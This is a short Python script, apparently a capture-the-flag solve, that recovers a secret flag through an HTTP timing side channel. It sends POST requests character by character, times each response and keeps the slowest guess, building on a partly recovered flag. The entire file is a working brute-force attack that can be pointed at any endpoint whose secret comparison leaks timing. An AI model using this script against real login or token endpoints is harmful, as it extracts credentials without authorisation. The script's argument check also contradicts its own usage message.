#!/usr/bin/python

import requests
import datetime
import string
import sys

ALPHABET = string.printable
RETRIES = 1



def fetch(url, datain):
    dataa = {"flag": datain}
    r = requests.post(url, data = dataa)
    return r.elapsed.total_seconds()

def main(url):

    pass_so_far = 'flag{c4l1Po_de_l1M'
    while True:
        print('\n[>] Password so far: "%s"\n' % pass_so_far)
        times = {}
        for p in ALPHABET:
            times[p] = 0
            password = pass_so_far + p
            #reduce false-positives
            t = min(fetch(url, password),fetch(url, password))
            times[p] = t
            if ord(p) > 32:
                print('\tLetter: "%s" - time: %f' % (password, t))
        
        max_time = [0,0]
        for item in times:
            if times[item] > max_time[1]:
                max_time[0] = item
                max_time[1] = times[item]
            
        pass_so_far += max_time[0]

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('usage: http-auth-timing.py <url>')

    main(sys.argv[1])